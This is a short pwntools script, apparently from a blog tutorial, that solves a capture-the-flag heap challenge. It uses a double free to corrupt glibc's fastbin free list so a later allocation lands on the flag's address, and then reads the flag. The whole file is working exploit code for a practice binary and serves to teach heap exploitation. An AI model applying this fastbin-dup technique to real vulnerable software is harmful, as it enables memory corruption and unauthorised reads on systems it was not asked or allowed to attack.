# blog.y2a.dev/articles/2022/05-07/fastbin_tutorial
from pwn import *

file = "./chall"
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

io = process(file)

def malloc(s: str):
    io.sendlineafter("> ", "1")
    io.sendlineafter(": ", s)

def free(s: str):
    io.sendlineafter("> ", "2")
    io.sendlineafter(": ", s)

def read(s: str):
    io.sendlineafter("> ", "3")
    io.sendlineafter(": ", s)

def write(s: str, addr: hex):
    io.sendlineafter("> ", "4")
    io.sendlineafter(": ", s)
    io.sendlineafter("> ", addr)

io.recvuntil("located at ")
addr_flag = int(io.recvuntil(".").rstrip(b".\n"), 16)

malloc("A")
malloc("B")
free("A") # fastbin: A -> NULL
free("B") # fastbin: B -> A -> NULL
free("A") # fastbin: A -> B -> A -> NULL
malloc("A") # fastbin: B -> A -> NULL
write("A", p64(addr_flag - 0x10)) # fd(A) = addr_flag
# fastbin: B -> A -> addr_flag -> NULL

malloc("B") # fastbin: A -> addr_flag -> NULL
malloc("C") # fastbin: addr_flag -> NULL
malloc("A") # A = addr_flag
read("A") # read(addr_flag)

io.interactive()
